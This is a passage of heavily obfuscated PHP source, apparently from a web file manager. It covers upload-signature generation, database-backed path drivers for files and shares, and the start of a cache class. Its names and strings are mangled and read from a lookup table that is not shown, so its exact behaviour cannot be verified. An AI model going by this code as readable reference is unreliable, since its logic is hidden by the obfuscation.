uploadFormData($A²‡ğ÷Ì«É, $Fœ¯à¡²¼¨ = 3600) { goto fÆ±†ÅßÖ; AãÉ’İÜ¨: return $BÍÛ³šáÕÂ; goto c ¬†’¹˜; Aí¨ÅØò†: $BÇ“êèÉ— = sha1($cª²õµÌñ‚); $a—µŸ‘«’ç = hash_hmac($f†ñá²Ù‡ğ[228], $BÇ“êèÉ—, $c‚Œœ®ÌŸ); $BÍÛ³šáÕÂ = array($f†ñá²Ù‡ğ[1173] => $aÏŸÌäƒø, $f†ñá²Ù‡ğ[1177] => $e‘ØóÙÆŠù, $f†ñá²Ù‡ğ[1181] => base64_encode($cª²õµÌñ‚), $f†ñá²Ù‡ğ[1178] => $fŞÂšè‚ô, $f†ñá²Ù‡ğ[1179] => $this->accessKey, $f†ñá²Ù‡ğ[1182] => $aéÀğ„ôø, $f†ñá²Ù‡ğ[1183] => $a—µŸ‘«’ç, $f†ñá²Ù‡ğ[175] => $this->getHost()); goto AãÉ’İÜ¨; F—ãÛî: $cª²õµÌñ‚ = array($f†ñá²Ù‡ğ[1171] => $d²Ğ´óÆ­, $f†ñá²Ù‡ğ[1172] => array(array($f†ñá²Ù‡ğ[1173] => $aÏŸÌäƒø), array($f†ñá²Ù‡ğ[1174] => $this->bucket), array($f†ñá²Ù‡ğ[1175], $f†ñá²Ù‡ğ[1176], $f†ñá²Ù‡ğ[33]), array($f†ñá²Ù‡ğ[1177] => $e‘ØóÙÆŠù), array($f†ñá²Ù‡ğ[1178] => $fŞÂšè‚ô), array($f†ñá²Ù‡ğ[1179] => $this->accessKey), array($f†ñá²Ù‡ğ[1180] => $aéÀğ„ôø))); $cª²õµÌñ‚ = json_encode($cª²õµÌñ‚); $c‚Œœ®ÌŸ = hash_hmac($f†ñá²Ù‡ğ[228], $aéÀğ„ôø, $this->secret); goto Aí¨ÅØò†; BæÊÓŸÕñ: $e‘ØóÙÆŠù = $f†ñá²Ù‡ğ[1169]; $d²Ğ´óÆ­ = gmdate($f†ñá²Ù‡ğ[1170], time() + $Fœ¯à¡²¼¨); $aéÀğ„ôø = (string) time() . $f†ñá²Ù‡ğ[67] . (string) (time() + $Fœ¯à¡²¼¨); goto F—ãÛî; fÆ±†ÅßÖ: $f†ñá²Ù‡ğ =& $_SERVER[ÉóçÄÇ]; $aÏŸÌäƒø = $f†ñá²Ù‡ğ[191]; $fŞÂšè‚ô = $f†ñá²Ù‡ğ[228]; goto BæÊÓŸÕñ; c ¬†’¹˜: } public function fileOutLink($Bğ‘ê’Ùêï) { $DáãĞ— =& $_SERVER[ÉóçÄÇ]; if (substr($Bğ‘ê’Ùêï, 0, 7) == $DáãĞ—[1184]) { $Bğ‘ê’Ùêï = $DáãĞ—[1185] . substr($Bğ‘ê’Ùêï, 7); } header($DáãĞ—[158] . $Bğ‘ê’Ùêï); die; } } goto e°ªä‰´Ç©; e°ªä‰´Ç©: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($d‘‡‰’ˆî) { $this->pathParse = $d‘‡‰’ˆî; $this->model = Model($_SERVER[ÉóçÄÇ][1186]); } public function getPath($eŞä÷ñ…Ÿˆ) { return trim($eŞä÷ñ…Ÿˆ, $_SERVER[ÉóçÄÇ][8]); } public function pathFather($FÆ·¸‚Ûê¿) { $DÂÚÜ¹ˆÜÀ = $this->parse($FÆ·¸‚Ûê¿); $DÂÚÜ¹ˆÜÀ = $this->infoSimple($FÆ·¸‚Ûê¿); return $DÂÚÜ¹ˆÜÀ ? $DÂÚÜ¹ˆÜÀ[$_SERVER[ÉóçÄÇ][472]] : !1; } public function pathThis($aÈÙëÛ¦®è) { $DµÙÙŸ»Ü˜ = $this->infoSimple($aÈÙëÛ¦®è); return $DµÙÙŸ»Ü˜ ? $DµÙÙŸ»Ü˜[$_SERVER[ÉóçÄÇ][28]] : !1; } public function getPathOuter($e©ôÉ˜Š·ˆ) { if (!$e©ôÉ˜Š·ˆ) { return $e©ôÉ˜Š·ˆ; } $fìŞéˆÂ³Õ = $this->parse($e©ôÉ˜Š·ˆ); return KodIO::make($fìŞéˆÂ³Õ[$_SERVER[ÉóçÄÇ][388]]); } public function copyFolderFromIO($EÓ¼£Íæ¨‚, $d‘‹æŞè§Á, $A‡²òïˆĞ†, $fï‘ò¿ ÒĞ, $Dš˜Èøå„) { $c¬É„•­å‘ = $this->model->copyFolderFromIO($EÓ¼£Íæ¨‚, $d‘‹æŞè§Á, $A‡²òïˆĞ†, $fï‘ò¿ ÒĞ, $Dš˜Èøå„); return KodIO::make($c¬É„•­å‘); } public function isParentOf($aÖ‰Ïëè–à, $bÚ›Úä®ù¼) { return $this->model->isParentOf($aÖ‰Ïëè–à, $bÚ›Úä®ù¼); } public function mkfile($E”ì¥§„È, $f¿ã’›é÷² = '', $eõß¦‡ßè­ = REPEAT_RENAME) { $BáËÇ³ŸÎ™ =& $_SERVER[ÉóçÄÇ]; $b˜Š„²ÖÆ‘ = $this->parse($E”ì¥§„È); $E”ì¥§„È = $b˜Š„²ÖÆ‘[$BáËÇ³ŸÎ™[388]]; for ($e‘šëÇÜá = 0; $e‘šëÇÜá < count($b˜Š„²ÖÆ‘[$BáËÇ³ŸÎ™[1187]]); $e‘šëÇÜá++) { $D™ğ«¬Ì¥ = $b˜Š„²ÖÆ‘[$BáËÇ³ŸÎ™[1187]][$e‘šëÇÜá]; if ($e‘šëÇÜá == count($b˜Š„²ÖÆ‘[$BáËÇ³ŸÎ™[1187]]) - 1) { $E”ì¥§„È = $this->model->mkfile($E”ì¥§„È, $D™ğ«¬Ì¥, $f¿ã’›é÷², $eõß¦‡ßè­); break; } $E”ì¥§„È = $this->model->mkdir($E”ì¥§„È, $D™ğ«¬Ì¥, REPEAT_SKIP); } return $this->getPathOuter($E”ì¥§„È); } public function mkdir($C½Ùòó†‹Ö, $AÂİ«Ì‹ô¬ = REPEAT_SKIP) { $d¾ÆÛÌŠ² =& $_SERVER[ÉóçÄÇ]; $eŒñ¹»ùùô = $this->parse($C½Ùòó†‹Ö); $C½Ùòó†‹Ö = $eŒñ¹»ùùô[$d¾ÆÛÌŠ²[388]]; for ($DË‘ä¤Ûêº = 0; $DË‘ä¤Ûêº < count($eŒñ¹»ùùô[$d¾ÆÛÌŠ²[1187]]); $DË‘ä¤Ûêº++) { $A†÷ô”ëø = $eŒñ¹»ùùô[$d¾ÆÛÌŠ²[1187]][$DË‘ä¤Ûêº]; $C½Ùòó†‹Ö = $this->model->mkdir($C½Ùòó†‹Ö, $A†÷ô”ëø, $AÂİ«Ì‹ô¬); } return $this->getPathOuter($C½Ùòó†‹Ö); } public function copyFile($fìî§ïÊ¸, $DçÎœÇ¡‹Ÿ, $cÁÁ–¢˜ìƒ = REPEAT_REPLACE) { $E•…ÂÂ²±¬ =& $_SERVER[ÉóçÄÇ]; $cô³øô…Å = $this->parse($DçÎœÇ¡‹Ÿ); $A˜‘ï¾Ğº¯ = $this->model->copy($fìî§ïÊ¸, $cô³øô…Å[$E•…ÂÂ²±¬[388]], $cÁÁ–¢˜ìƒ, $cô³øô…Å[$E•…ÂÂ²±¬[75]]); return $A˜‘ï¾Ğº¯ ? $this->getPathOuter($A˜‘ï¾Ğº¯) : !1; } public function moveFile($B¼èÃ°³, $aËèƒïóĞÃ, $FùÁÀ’Í­¶ = REPEAT_REPLACE) { $aéĞù„ƒ·Š =& $_SERVER[ÉóçÄÇ]; $bï½ù¸–² = $this->parse($aËèƒïóĞÃ); $dø†Ñ©øÒ° = $this->model->move($B¼èÃ°³, $bï½ù¸–²[$aéĞù„ƒ·Š[388]], $FùÁÀ’Í­¶, $bï½ù¸–²[$aéĞù„ƒ·Š[75]]); return $dø†Ñ©øÒ° ? $this->getPathOuter($dø†Ñ©øÒ°) : !1; } public function copy($D¨¬Û˜¦Ğ, $dø§¯ ÆÒÓ, $eË¼²í¢½† = REPEAT_REPLACE) { $D•Ş±ÀÆ©ù = $this->parse($dø§¯ ÆÒÓ); $EãéÒÓÈ¾ª = $this->model->copy($D¨¬Û˜¦Ğ, $D•Ş±ÀÆ©ù[$_SERVER[ÉóçÄÇ][388]], $eË¼²í¢½†); return $EãéÒÓÈ¾ª ? $this->getPathOuter($EãéÒÓÈ¾ª) : !1; } public function moveSameAllow() { } public function move($D–ÕÊŸÔ , $cÉâèâÙº, $f‰”Î”Ô£è = REPEAT_REPLACE) { $AæÅ–«ŒÒ¨ = $this->parse($cÉâèâÙº); $D‰Ó°½ƒ³ = $this->model->move($D–ÕÊŸÔ , $AæÅ–«ŒÒ¨[$_SERVER[ÉóçÄÇ][388]], $f‰”Î”Ô£è); return $D‰Ó°½ƒ³ ? $this->getPathOuter($D‰Ó°½ƒ³) : !1; } public function remove($Aã¶Õ˜È¨, $DÅ¸Ş—ĞŒ· = true) { return $this->model->remove($Aã¶Õ˜È¨, $DÅ¸Ş—ĞŒ·); } public function rename($a„†‚„÷»Ê, $eÆº”ñ¥ÆÇ) { $fËÏ—‚†§½ = $this->model->rename($a„†‚„÷»Ê, $eÆº”ñ¥ÆÇ); return $fËÏ—‚†§½ ? $this->getPathOuter($a„†‚„÷»Ê) : $fËÏ—‚†§½; } public function size($cáœãêÓçº) { $B‘–èÈ¾± = $this->infoSimple($cáœãêÓçº); return $B‘–èÈ¾± ? $B‘–èÈ¾±[$_SERVER[ÉóçÄÇ][77]] : 0; } public function infoSimple($Dˆá›±¡İ) { return $this->model->sourceInfo($Dˆá›±¡İ); } public function info($e„‰â£ƒá) { return $this->infoParse($e„‰â£ƒá); } public function infoAuth($cÙÎ¡âàô·) { return $this->infoParse($cÙÎ¡âàô·, !1, !0); } public function infoWithChildren($D¶Éõ ”µ) { return $this->infoParse($D¶Éõ ”µ, !0); } protected function infoParse($E‚Õ…ØœÆˆ, $fåİ÷é°Ğö = false, $C…‹™Ùïš = false) { if (!$fåİ÷é°Ğö) { return $this->model->pathInfo($E‚Õ…ØœÆˆ, $C…‹™Ùïš); } return $this->model->pathInfoMore($E‚Õ…ØœÆˆ); } public function infoFull($d¬®¾ˆùÚø) { $B±‹¬ñ‰Àö =& $_SERVER[ÉóçÄÇ]; $EÄÆù´µØ = explode($B±‹¬ñ‰Àö[8], $d¬®¾ˆùÚø); $cëÙ­™§äŠ = implode($B±‹¬ñ‰Àö[8], array_splice($EÄÆù´µØ, 1)); return $this->model->pathInfoByPath($EÄÆù´µØ[0], $cëÙ­™§äŠ); } public function hashSimple($bÚ½¢í´Îê) { $eë­†ŠÈ† =& $_SERVER[ÉóçÄÇ]; $Cäó·’Çè’ = $this->infoWithChildren($bÚ½¢í´Îê); return $Cäó·’Çè’[$eë­†ŠÈ†[163]][$eë­†ŠÈ†[170]]; } public function hashMd5($bÌçÓ“¤) { $EêŠ¸Ô¢ç =& $_SERVER[ÉóçÄÇ]; $FÌ×»×àŒ½ = $this->infoWithChildren($bÌçÓ“¤); return $FÌ×»×àŒ½[$EêŠ¸Ô¢ç[163]][$EêŠ¸Ô¢ç[169]]; } public function exist($E„÷÷ŸÏÉñ) { $Bì†²âò‚ =& $_SERVER[ÉóçÄÇ]; $f•¶ù¿¸´„ = $this->parse($E„÷÷ŸÏÉñ); if (!$f•¶ù¿¸´„[$Bì†²âò‚[75]]) { return $this->isFile($E„÷÷ŸÏÉñ) || $this->isFolder($E„÷÷ŸÏÉñ); } $Dì³ÓÂê˜… = array($Bì†²âò‚[389] => $f•¶ù¿¸´„[$Bì†²âò‚[388]], $Bì†²âò‚[28] => $f•¶ù¿¸´„[$Bì†²âò‚[75]]); $f´áÑ®‚é© = $this->model->where($Dì³ÓÂê˜…)->find(); return $f´áÑ®‚é© ? !0 : !1; } public function isFile($E¤Œ‰ùƒ¸’) { $D‹‰İá¬‹Ì =& $_SERVER[ÉóçÄÇ]; $fÃ‚—Ñï« = $this->infoSimple($E¤Œ‰ùƒ¸’); return $fÃ‚—Ñï« && $fÃ‚—Ñï«[$D‹‰İá¬‹Ì[397]] == $D‹‰İá¬‹Ì[86] ? !1 : !0; } public function isFolder($EÏŠ•·áõÒ) { $bÍ÷¿“ô— =& $_SERVER[ÉóçÄÇ]; $AŒêæïŞóº = $this->infoSimple($EÏŠ•·áõÒ); return $AŒêæïŞóº && $AŒêæïŞóº[$bÍ÷¿“ô—[397]] == $bÍ÷¿“ô—[86] ? !0 : !1; } public function listPath($a§Ô£ŠÛ›´, $b¥ÙÊ¨‘ = false) { $FÈ¸¸æÉ¼… =& $_SERVER[ÉóçÄÇ]; if ($a§Ô£ŠÛ›´ == $FÈ¸¸æÉ¼…[33]) { return !1; } $e³Ãô‹ê = array($FÈ¸¸æÉ¼…[389] => $a§Ô£ŠÛ›´); if ($b¥ÙÊ¨‘) { return $this->model->listSource($e³Ãô‹ê, -1); } return $this->model->listSource($e³Ãô‹ê); } public function has($DßºÇ‹Ó¼, $C×ÇÖôùŞ‘ = false, $c­Úš¥³—‰ = null) { $bÑ´­Š©ÇÍ =& $_SERVER[ÉóçÄÇ]; $e‰ßƒğ¡÷á = $this->infoWithChildren($DßºÇ‹Ó¼); if ($C×ÇÖôùŞ‘) { return array($bÑ´­Š©ÇÍ[202] => $e‰ßƒğ¡÷á[$bÑ´­Š©ÇÍ[202]], $bÑ´­Š©ÇÍ[201] => $e‰ßƒğ¡÷á[$bÑ´­Š©ÇÍ[201]]); } return $c­Úš¥³—‰ ? $e‰ßƒğ¡÷á[$bÑ´­Š©ÇÍ[202]] : $e‰ßƒğ¡÷á[$bÑ´­Š©ÇÍ[201]]; } public function listAll($FèÄÈçÆÔº) { $fÆÒªôççË = IO::info($this->pathParse[$_SERVER[ÉóçÄÇ][75]]); if (!$fÆÒªôççË) { return array(); } return $this->model->listAll($FèÄÈçÆÔº); } public function getContent($bèˆ…Ü²ç±) { return $this->model->getContent($bèˆ…Ü²ç±); } public function setContent($e¿¨ÙæğÓ‡, $a°Ğóç§’Ÿ = '') { return $this->model->setContent($e¿¨ÙæğÓ‡, $a°Ğóç§’Ÿ); } public function fileSubstr($Cù•–çêµ¤, $cÄ‰‡öë„‘, $a‘öÃŒ†•) { return $this->model->fileSubstr($Cù•–çêµ¤, $cÄ‰‡öë„‘, $a‘öÃŒ†•); } public function download($FŞ‹øµ¨ñÎ, $e±½öã…’É = '') { $C¹å©çŸéº = get_path_father($e±½öã…’É); $E–¬Ã‡¼— = get_path_this($e±½öã…’É); $a´Òâ›ù ½ = $this->model->fileInfoGet($FŞ‹øµ¨ñÎ); $a‹íšÕ¹¬ = IO::copy($a´Òâ›ù ½[$_SERVER[ÉóçÄÇ][75]], $C¹å©çŸéº, !1, $E–¬Ã‡¼—); return $a‹íšÕ¹¬; } public function setModifyTime($cñ©ˆÏ†“ø, $Fİ²š›ã²¶ = '') { $this->model->metaSet($cñ©ˆÏ†“ø, $_SERVER[ÉóçÄÇ][1188], $Fİ²š›ã²¶); } public function upload($DáÎÈâ•¥, $C½Š§ß¡Åø, $bæ¼šÌ¥•¥ = false, $CÂ­µò¤¹ = REPEAT_REPLACE) { $AÒª¡Äƒšø =& $_SERVER[ÉóçÄÇ]; $eŒ„áÚŒ‡¹ = $this->parse($DáÎÈâ•¥); $CœåÌÀœÈÃ = $this->model->addFile($eŒ„áÚŒ‡¹[$AÒª¡Äƒšø[388]], $C½Š§ß¡Åø, $eŒ„áÚŒ‡¹[$AÒª¡Äƒšø[75]], $bæ¼šÌ¥•¥, $CÂ­µò¤¹); return $this->getPathOuter($CœåÌÀœÈÃ); } public function uploadFileByID($DĞº™¡Ü«â, $d÷ÓŒ³ÚŞÊ, $E‚¯°·¨Ğ) { $C÷Õ„Ù¶³³ =& $_SERVER[ÉóçÄÇ]; $DªÛÙÂ¡ÏÔ = $this->parse($DĞº™¡Ü«â); $C÷ÕÖÈö¾ = $this->model->addFileByFileID($DªÛÙÂ¡ÏÔ[$C÷Õ„Ù¶³³[388]], $d÷ÓŒ³ÚŞÊ, $DªÛÙÂ¡ÏÔ[$C÷Õ„Ù¶³³[75]], $E‚¯°·¨Ğ); return $this->getPathOuter($C÷ÕÖÈö¾); } public function addFileByRemote($CÚ²õŸ«Õ, $B·¦—Ó–œ, $CÑ¶Óã»ë = array(), $d£†‰äŒ… = '', $b†™íµçêØ) { $aŠæ½ë…î =& $_SERVER[ÉóçÄÇ]; $eƒÉèö§‹Š = $this->parse($CÚ²õŸ«Õ); $d£†‰äŒ… = empty($d£†‰äŒ…) ? $eƒÉèö§‹Š[$aŠæ½ë…î[75]] : $d£†‰äŒ…; $c£¼²„ô½ø = $this->model->addFileByRemote($eƒÉèö§‹Š[$aŠæ½ë…î[388]], $B·¦—Ó–œ, $d£†‰äŒ…, $CÑ¶Óã»ë, $b†™íµçêØ); return $this->getPathOuter($c£¼²„ô½ø); } public function uploadLink($aã»‡ÒĞÅİ, $e‹õğİº¡Á = 0) { $e•‰¤ëñï =& $_SERVER[ÉóçÄÇ]; $B•›ÈˆÜó‚ = $this->parse($aã»‡ÒĞÅİ); $aã»‡ÒĞÅİ = Model($e•‰¤ëñï[566])->createFileName($B•›ÈˆÜó‚[$e•‰¤ëñï[75]]); $bŒ¼¬†Æ´ = IO::uploadLink($aã»‡ÒĞÅİ, $e‹õğİº¡Á); return $bŒ¼¬†Æ´; } public function fileNameAuto($Bó©¹Šˆ¼”, $dÃíî…ˆªà, $c¦´‚©‰Ã¦ = REPEAT_REPLACE, $d¶£­Ú •× = false) { return $this->model->fileNameAuto($Bó©¹Šˆ¼”, $dÃíî…ˆªà, $c¦´‚©‰Ã¦, $d¶£­Ú •×); } public function fileNameExist($b¦›„Šµ¹ğ, $A’ÖÅóéš) { return $this->model->fileNameExist($b¦›„Šµ¹ğ, $A’ÖÅóéš); } protected function _fileOut($E®Ô­«„ó‰, $AÈ¹Î¡Üã» = false, $C›Ø¶ÒÂ‰ = false, $aºèÈ‰§Æ = '', $EĞƒİÑ‘à§ = false) { goto FìÀ°Ø›Œƒ; D°˜‡§“: if ($EĞƒİÑ‘à§) { return IO::fileOutServer($aÌ“ğµøÜ[$b¯±ø×«Ø[75]], $AÈ¹Î¡Üã», $C¬ê«ÀÜìê, $aºèÈ‰§Æ); } IO::fileOut($aÌ“ğµøÜ[$b¯±ø×«Ø[75]], $AÈ¹Î¡Üã», $C¬ê«ÀÜìê, $aºèÈ‰§Æ); goto D»¨¹¢ÔÑ; A¢óÖÙÑƒ: $aÌ“ğµøÜ = $this->model->fileInfoGet($E®Ô­«„ó‰); $aºèÈ‰§Æ = $aÌ“ğµøÜ[$b¯±ø×«Ø[169]] ? $aÌ“ğµøÜ[$b¯±ø×«Ø[169]] : $aºèÈ‰§Æ; $C¬ê«ÀÜìê = isset($GLOBALS[$b¯±ø×«Ø[1190]]) ? $GLOBALS[$b¯±ø×«Ø[1190]] : $E¢¯´¦İäÌ[$b¯±ø×«Ø[28]]; goto D°˜‡§“; FìÀ°Ø›Œƒ: $b¯±ø×«Ø =& $_SERVER[ÉóçÄÇ]; $E¢¯´¦İäÌ = $this->model->sourceInfo($E®Ô­«„ó‰); if ($E¢¯´¦İäÌ[$b¯±ø×«Ø[397]] == $b¯±ø×«Ø[86]) { header($b¯±ø×«Ø[1189]); die; } goto A¢óÖÙÑƒ; D»¨¹¢ÔÑ: } public function fileOut($FàØ˜Â‰È, $f÷Ñ¸ÈØå™ = false, $a¦‰Ğ…áë = false, $aÉê¾Øàº = '') { $this->_fileOut($FàØ˜Â‰È, $f÷Ñ¸ÈØå™, $a¦‰Ğ…áë, $aÉê¾Øàº); } public function fileOutServer($dÛ³ñ’„ïÈ, $aáÀöÜÀ§Š = false, $a’„¶‚ÔŠ¾ = false, $aóÓ¦„Ë”° = '') { $this->_fileOut($dÛ³ñ’„ïÈ, $aáÀöÜÀ§Š, $a’„¶‚ÔŠ¾, $aóÓ¦„Ë”°, !0); } protected function _fileOutImage($dæòä¤ÀòÀ, $B†áÄ‚ô = 250) { goto e“£Ú²èäÌ; e“£Ú²èäÌ: $eô®ôàË–ç =& $_SERVER[ÉóçÄÇ]; $bÊì“•ôØ = $this->model->pathInfo($dæòä¤ÀòÀ); if ($bÊì“•ôØ[$eô®ôàË–ç[397]] == $eô®ôàË–ç[86]) { show_json($eô®ôàË–ç[1191] . $dæòä¤ÀòÀ, !1); } goto DÛÓ¬Œßí¼; DÛÓ¬Œßí¼: $cà¼¬¬äÜ = $this->model->fileInfoGet($dæòä¤ÀòÀ); $cà¼¬¬äÜ[$eô®ôàË–ç[28]] = $bÊì“•ôØ[$eô®ôàË–ç[28]]; $cà¼¬¬äÜ[$eô®ôàË–ç[162]] = $bÊì“•ôØ[$eô®ôàË–ç[162]]; goto D††›¹¿¯; D††›¹¿¯: $GLOBALS[$eô®ôàË–ç[1190]] = $cà¼¬¬äÜ[$eô®ôàË–ç[28]]; $GLOBALS[$eô®ôàË–ç[161]] = $cà¼¬¬äÜ; IO::fileOutImage($cà¼¬¬äÜ[$eô®ôàË–ç[75]], $B†áÄ‚ô); goto eß¼ÄôÈÒ; eß¼ÄôÈÒ: } public function fileOutImage($B¼†ÑĞ–, $AâµÓĞ…¾² = 250) { $this->_fileOutImage($B¼†ÑĞ–, $AâµÓĞ…¾²); } public function fileOutImageServer($CÇ¦¤Ö˜, $F²¸‡ ÌÉœ = 250) { $this->_fileOutImage($CÇ¦¤Ö˜, $F²¸‡ ÌÉœ); } public function link($bÌì“É°½¹, $f·¼›Ş¹İ™ = '') { $CÃª¸å´ä¤ = $this->model->fileInfoGet($bÌì“É°½¹); return IO::link($CÃª¸å´ä¤[$_SERVER[ÉóçÄÇ][75]], $f·¼›Ş¹İ™); } protected function parse($d±ÚßìŠ·) { $Eø®¹¤‘‘ =& $_SERVER[ÉóçÄÇ]; if (strstr($d±ÚßìŠ·, $Eø®¹¤‘‘[8]) === !1) { return array($Eø®¹¤‘‘[406] => intval($d±ÚßìŠ·), $Eø®¹¤‘‘[75] => $Eø®¹¤‘‘[33], $Eø®¹¤‘‘[1187] => array()); } $C­¤‚ŠéŒæ = explode($Eø®¹¤‘‘[8], trim($d±ÚßìŠ·, $Eø®¹¤‘‘[8])); if (count($C­¤‚ŠéŒæ) < 2) { show_tips($d±ÚßìŠ· . $Eø®¹¤‘‘[1192]); } return array($Eø®¹¤‘‘[406] => intval($C­¤‚ŠéŒæ[0]), $Eø®¹¤‘‘[75] => $C­¤‚ŠéŒæ[1], $Eø®¹¤‘‘[1187] => array_slice($C­¤‚ŠéŒæ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($e‰‡Ñöö) { $this->pathParse = $e‰‡Ñöö; $this->model = Model($_SERVER[ÉóçÄÇ][1186]); } public function getPathOuter($a½’šº³¢ğ) { $BÁØ²‚¿íê =& $_SERVER[ÉóçÄÇ]; if (!$a½’šº³¢ğ) { return $a½’šº³¢ğ; } $eğÛ‹µ¾è‘ = $this->parse($a½’šº³¢ğ); return trim(KodIO::makeShare($this->pathParse[$BÁØ²‚¿íê[388]], $eğÛ‹µ¾è‘[$BÁØ²‚¿íê[388]]), $BÁØ²‚¿íê[8]); } protected function infoParse($BÏ‹“±˜Ö, $BÕº»Ïœ = false, $cØñíºï» = false) { $AÒª®îƒ =& $_SERVER[ÉóçÄÇ]; $Cê½Å™ƒ‹ = $this->pathParse[$AÒª®îƒ[388]]; $E…ŠğÇ¤ˆÖ = trim($this->pathParse[$AÒª®îƒ[1046]], $AÒª®îƒ[8]); return Action($AÒª®îƒ[1193])->sharePathInfo($Cê½Å™ƒ‹, $E…ŠğÇ¤ˆÖ); } public function infoFull($f–÷ëÒŞƒ÷) { $e·§·óÊòë =& $_SERVER[ÉóçÄÇ]; $EµêÜ¥‚‚… = explode($e·§·óÊòë[8], trim($f–÷ëÒŞƒ÷, $e·§·óÊòë[8])); if (count($EµêÜ¥‚‚…) > 1) { $d¥¥õØ‚Ã = implode($e·§·óÊòë[8], array_splice($EµêÜ¥‚‚…, 1)); $C²á’Ì¬à‹ = $this->model->pathInfoByPath($EµêÜ¥‚‚…[0], $d¥¥õØ‚Ã); if (!$C²á’Ì¬à‹) { return !1; } $this->pathParse[$e·§·óÊòë[1046]] = $C²á’Ì¬à‹[$e·§·óÊòë[390]]; } return $this->infoParse($f–÷ëÒŞƒ÷); } public function listAll($D³¿Ú¢Åë) { goto B«ŒàßĞÏ¥; A¡ğº§¦İ·: foreach ($d£Ö’Õ”ß as &$bª¨¤¢Ä÷Ê) { check_abort(); $bª¨¤¢Ä÷Ê[$Fƒõ›©âÛ[84]] = $FœÜº‹‚Ãš->_shareItemeParse($bª¨¤¢Ä÷Ê[$Fƒõ›©âÛ[84]], $D’…ÔÍÒ§«); } unset($bª¨¤¢Ä÷Ê); return $d£Ö’Õ”ß; goto Dô®˜×Š½; dË“÷ê¦: $d£Ö’Õ”ß = $this->model->listAll($D³¿Ú¢Åë); $D’…ÔÍÒ§« = Model($Fƒõ›©âÛ[558])->getInfo($e«£‚›Ìà“[$Fƒõ›©âÛ[462]]); $FœÜº‹‚Ãš = Action($Fƒõ›©âÛ[1193]); goto A¡ğº§¦İ·; B«ŒàßĞÏ¥: $Fƒõ›©âÛ =& $_SERVER[ÉóçÄÇ]; $e«£‚›Ìà“ = IO::info($this->pathParse[$Fƒõ›©âÛ[75]]); if (!$e«£‚›Ìà“) { return array(); } goto dË“÷ê¦; Dô®˜×Š½: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($c½¦Ç¸Ñ‡î) { $this->pathParse = $c½¦Ç¸Ñ‡î; $this->model = Model($_SERVER[ÉóçÄÇ][1186]); } protected function infoParse($D…°êå‹‡÷, $FÆÆ´Õ³³ = false, $BÚÚ·Ô‘š¼ = false) { $cÙ£Çì…Ã— =& $_SERVER[ÉóçÄÇ]; return Action($cÙ£Çì…Ã—[1052])->sharePathInfo($this->pathParse[$cÙ£Çì…Ã—[75]], !0); } public function listPath($d¼¼­±š, $a¹ŒĞøØ¾ = false) { $cªÅ¾¡¬òŒ =& $_SERVER[ÉóçÄÇ]; $e¬„Æ¸Ì™ = parent::listPath($d¼¼­±š, $a¹ŒĞøØ¾); foreach ($e¬„Æ¸Ì™ as $B¶ø¸ø’÷ => $fÙ”«£¶á) { if (!in_array($B¶ø¸ø’÷, array($cªÅ¾¡¬òŒ[73], $cªÅ¾¡¬òŒ[74]))) { continue; } foreach ($fÙ”«£¶á as $b†‹¼åš¢¦ => $EÆÄÏ¹Óæ) { $e¬„Æ¸Ì™[$B¶ø¸ø’÷][$b†‹¼åš¢¦] = Action($cªÅ¾¡¬òŒ[1052])->shareItemInfo($EÆÄÏ¹Óæ); } } return $e¬„Æ¸Ì™; } public function listAll($aíåˆ“ôâ) { goto Dœ¶Ú¶Ü¤; A‘Ş ÌŒ ²: $dÀÆÔ•÷› = $this->model->listAll($aíåˆ“ôâ); foreach ($dÀÆÔ•÷› as &$aøíŒìğØ±) { $aøíŒìğØ±[$cÑ• ÁòÄ[84]] = Action($cÑ• ÁòÄ[1052])->shareItemInfo($aøíŒìğØ±[$cÑ• ÁòÄ[84]]); } unset($aøíŒìğØ±); goto eƒ°‰›Ë«ö; Dœ¶Ú¶Ü¤: $cÑ• ÁòÄ =& $_SERVER[ÉóçÄÇ]; $fÊ°œô¨ß› = IO::info($this->pathParse[$cÑ• ÁòÄ[75]]); if (!$fÊ°œô¨ß›) { return array(); } goto A‘Ş ÌŒ ²; eƒ°‰›Ë«ö: return $dÀÆÔ•÷›; goto aŸî¾­éº; aŸî¾­éº: } } goto cƒ°‡Ë®†; F‹µÓŠƒ‰: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto b×¤Ëç³Ù×; E¾¼ùŠ²—°: switch ($Bæ—ùœ´­[$FÃß¢©¸‰´[778]]) { case $FÃß¢©¸‰´[17]: self::$handle = Model($FÃß¢©¸‰´[780]); break; case $FÃß¢©¸‰´[781]: self::$handle = new CacheRedis($aÓŒÇÄ–º½, $féøµˆ§ñ•); break; case $FÃß¢©¸‰´[782]: self::$handle = new CacheMemcached($aÓŒÇÄ–º½, $féøµˆ§ñ•); break; case $FÃß¢©¸‰´[173]: self::$handle = new CacheFile($aÓŒÇÄ–º½, $féøµˆ§ñ•); break; default: break; } return self::$handle; goto Dé„³ñí³¼; fÍáùÅÛ¡ê: $Bæ—ùœ´­ = $GLOBALS[$FÃß¢©¸‰´[6]][$FÃß¢©¸‰´[345]]; $aÓŒÇÄ–º½ = $Bæ—ùœ´­[$Bæ—ùœ´­[$FÃß¢©¸‰´[778]]]; $féøµˆ§ñ• = $Bæ—ùœ´­[$FÃß¢©¸‰´[779]]; goto E¾¼ùŠ²—°; b×¤Ëç³Ù×: $FÃß¢©¸‰´ =& $_SERVER[ÉóçÄÇ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fÍáùÅÛ¡ê; Dé„³ñí³¼: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($DŠÓíÜòŠŞ) { if (is_array($DŠÓíÜòŠŞ) || is_object($DŠÓíÜòŠŞ)) { $DŠÓíÜòŠŞ = json_encode($DŠÓíÜòŠŞ); } $DŠÓíÜòŠŞ = rawurlencode($DŠÓíÜòŠŞ); return md5(KOD_SITE_ID . $_SERVER[ÉóçÄÇ][70] . $DŠÓíÜòŠŞ); } public static function get($C°º³³¯¼, $F—¸¹Î£‰ˆ = false) { $dÇ»‚ì­–¶ = self::key($C°º³³¯¼); if ($F—¸¹Î£‰ˆ) { return unserialize(self::init()->get($dÇ»‚ì­–¶)); } if (!isset(self::$memoryCache[$dÇ»‚ì­–¶])) { $càçø©ñ• = self::init()->get($dÇ»‚ì­–¶); self::$memoryCache[$dÇ»‚ì­–¶] = unserialize($càçø©ñ•); } return self::$memoryCache[$dÇ»‚ì­–¶]; } public static function set($DÁ¢›ù×, $C‡•íÕ´ãÑ, 